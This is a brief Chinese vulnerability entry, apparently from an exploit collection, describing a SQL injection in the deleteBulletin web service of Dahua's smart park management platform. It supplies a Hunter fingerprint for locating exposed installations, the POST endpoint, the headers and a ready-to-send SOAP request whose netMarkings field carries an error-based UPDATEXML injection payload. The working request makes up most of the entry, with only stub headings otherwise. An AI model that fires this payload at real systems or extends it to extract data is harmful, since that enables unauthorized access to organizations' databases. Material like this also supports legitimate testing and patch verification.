# 大华智慧园区综合管理平台deleteBulletinSQL注入漏洞

- **系统**：大华　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`hunter：`app.name="Dahua 大华 智慧园区管理平台"``
- **请求**：`POST /portal/services/itcBulletin HTTP/1.1`
- **关键头**：`Content-Type: text/xml;charset=UTF-8`　`Host: {hostname}`　`Content-Length: 442`

**请求体 / payload**
```
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:itc="http://itcbulletinservice.webservice.dssc.dahua.com">
<soapenv:Header/>
<soapenv:Body>
<itc:deleteBulletin>
<!--type: string-->
<netMarkings>(UPDATEXML(2326,
CONCAT(0x2e,0x71706a7171,(select 111*111),0x71706a7171),4027)))AND (2373=2373</netMarkings>
</itc:deleteBulletin>
</soapenv:Body>
</soapenv:Envelope>
```

**其他**
- 大华智慧园区综合管理平台deleteBulletin SQL注入漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 大华智慧园区综合管理平台